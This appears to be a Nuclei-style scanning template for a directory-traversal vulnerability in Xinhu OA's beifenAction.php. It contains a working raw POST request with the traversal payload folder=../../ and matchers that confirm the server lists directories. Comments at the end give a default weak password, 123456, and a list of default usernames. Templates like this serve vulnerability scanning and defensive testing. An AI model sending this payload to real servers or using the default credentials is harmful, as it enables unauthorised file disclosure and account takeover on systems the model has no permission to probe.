id: xinhuOA-beifenAction-dir-listing

info:
  name: 信呼OA beifenAction.php 后台目录遍历漏洞
  author: cnaq
  severity: medium   
  description: 信呼OA beifenAction.php文件中调用了 getfilerows方法，导致了目录遍历漏洞，攻击者通过漏洞可以获取服务器上的文件信息
  reference: 
    - http://wiki.peiqi.tech/wiki/oa/%E4%BF%A1%E5%91%BCOA/%E4%BF%A1%E5%91%BCOA%20beifenAction.php%20%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E.html
  tags: xinhuOA,dir,listing

requests:
  - raw:
      - |
        POST /index.php?a=getdatssss&m=beifen&d=system&ajaxbool=true HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        folder=../../

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          
      - type: word
        part: body
        words:
          - 'rows'

# 默认存在几个用户存在弱口令 123456
# admin
# diaochan
# xiaoqa
# daqiao
# rock
# zhangfei
# zhaozl
# xinhu
